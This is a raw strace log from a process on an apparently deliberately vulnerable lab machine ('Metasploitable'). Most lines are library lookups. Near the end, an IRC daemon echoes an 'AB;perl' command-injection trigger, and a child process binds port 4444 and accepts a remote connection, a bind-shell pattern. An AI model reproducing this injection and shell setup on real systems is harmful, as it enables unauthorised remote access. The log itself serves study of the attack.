7696  07:19:58.160883 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160895 stat64("/usr/lib/tls/i686", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160906 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160919 stat64("/usr/lib/tls/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160930 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160943 stat64("/usr/lib/tls/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160954 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160966 stat64("/usr/lib/tls/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160977 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160989 stat64("/usr/lib/tls", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161000 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161012 stat64("/usr/lib/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161024 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161041 stat64("/usr/lib/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161054 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161067 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.161085 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161097 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.161114 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161126 stat64("/usr/lib/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161138 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161150 stat64("/usr/lib/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161161 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161173 stat64("/usr/lib/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161184 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161195 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
7696  07:19:58.161212 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161226 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161239 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161252 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161267 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161281 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161293 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161306 stat64("/lib/i486-linux-gnu/tls/i686", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161318 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161332 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161344 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161357 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161369 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161381 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161393 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161406 stat64("/lib/i486-linux-gnu/tls", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161417 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161431 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161443 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161456 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161468 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161481 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161493 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161505 stat64("/lib/i486-linux-gnu/i686", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161517 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161530 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161549 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161562 stat64("/lib/i486-linux-gnu/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161573 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161586 stat64("/lib/i486-linux-gnu/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161598 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161610 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.161627 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161641 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161654 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161668 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161680 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161694 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161709 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161722 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161735 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161749 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161761 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161774 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161787 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161800 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161812 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161825 stat64("/usr/lib/i486-linux-gnu/tls", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161837 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161851 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161863 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161877 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161889 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161902 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161915 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161927 stat64("/usr/lib/i486-linux-gnu/i686", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161939 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161953 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161965 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.161978 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.161990 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.162003 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.162015 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.162027 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.162088 munmap(0xb7d9a000, 29913) = 0
7696  07:19:58.162109 open("/etc/ld.so.cache", O_RDONLY) = 6
7696  07:19:58.162121 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7696  07:19:58.162138 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d9a000
7696  07:19:58.162148 close(6)          = 0
7696  07:19:58.162158 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7696  07:19:58.162173 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
7696  07:19:58.162188 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7696  07:19:58.162283 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
7696  07:19:58.162305 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d8f000
7696  07:19:58.162317 mmap2(0xb7d98000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d98000
7696  07:19:58.162334 close(6)          = 0
7696  07:19:58.162363 munmap(0xb7d9a000, 29913) = 0
7696  07:19:58.162379 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
7696  07:19:58.162396 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
7696  07:19:58.162411 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
7696  07:19:58.162428 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da1000
7696  07:19:58.162439 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
7696  07:19:58.162638 close(6)          = 0
7696  07:19:58.162649 munmap(0xb7da1000, 4096) = 0
7696  07:19:58.162668 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
7696  07:19:58.162682 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
7696  07:19:58.162698 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da1000
7696  07:19:58.162709 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
7696  07:19:58.162886 close(6)          = 0
7696  07:19:58.162896 munmap(0xb7da1000, 4096) = 0
7696  07:19:58.162923 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
7696  07:19:58.162945 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa1148) = -1 EINVAL (Invalid argument)
7696  07:19:58.162958 _llseek(6, 0, 0xbffa1190, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7696  07:19:58.162970 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa1148) = -1 EINVAL (Invalid argument)
7696  07:19:58.162980 _llseek(6, 0, 0xbffa1190, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7696  07:19:58.162990 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
7696  07:19:58.163090 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
7696  07:19:58.169460 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
7696  07:19:58.169460 listen(6, 5)      = 0
7696  07:19:58.169460 accept(6,  <unfinished ...>
7695  07:19:58.169824 exit_group(0)     = ?
7693  07:19:58.169922 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 7695
7693  07:19:58.169939 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7693  07:19:58.169980 --- SIGCHLD (Child exited) @ 0 (0) ---
7693  07:19:58.169989 waitpid(-1, 0xbfc34fa8, WNOHANG) = -1 ECHILD (No child processes)
7693  07:19:58.170001 sigreturn()       = ? (mask now [])
7693  07:19:58.170018 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
7693  07:19:58.170093 exit_group(0)     = ?
4519  07:19:58.170149 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 7693
4519  07:19:58.170162 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:19:58.170177 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:19:58.170202 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:19:58.170231 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:19:58.170252 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:19:58.170389 gettimeofday({1495624798, 170394}, NULL) = 0
4519  07:19:58.170405 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [7], left {1, 0})
4519  07:19:58.170451 clock_gettime(CLOCK_MONOTONIC, {1607, 987464749}) = 0
4519  07:19:58.170466 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:19:58.170632 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170655 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170670 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170699 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170712 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170727 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170740 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170754 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170768 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170797 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170825 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170839 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170852 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170866 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170894 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170908 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170921 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170935 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170949 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170965 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170979 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.170993 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 230000}, ...}) = 0
4519  07:19:58.171011 time(NULL)        = 1495624798
4519  07:19:58.171021 time(NULL)        = 1495624798
4519  07:19:58.171034 gettimeofday({1495624798, 171038}, NULL) = 0
4519  07:19:58.171046 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:19:58.171075 clock_gettime(CLOCK_MONOTONIC, {1607, 988087989}) = 0
4519  07:19:58.171086 gettimeofday({1495624798, 171089}, NULL) = 0
4519  07:19:58.171102 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
7696  07:19:58.528746 <... accept resumed> {sa_family=AF_INET, sin_port=htons(41295), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
7696  07:19:58.528843 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0138) = -1 EINVAL (Invalid argument)
7696  07:19:58.528859 _llseek(8, 0, 0xbffa0180, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7696  07:19:58.528871 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0138) = -1 EINVAL (Invalid argument)
7696  07:19:58.528881 _llseek(8, 0, 0xbffa0180, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7696  07:19:58.528891 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
7696  07:19:58.528933 close(6)          = 0
7696  07:19:58.529000 dup(8)            = 6
7696  07:19:58.529013 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0fd8) = -1 EINVAL (Invalid argument)
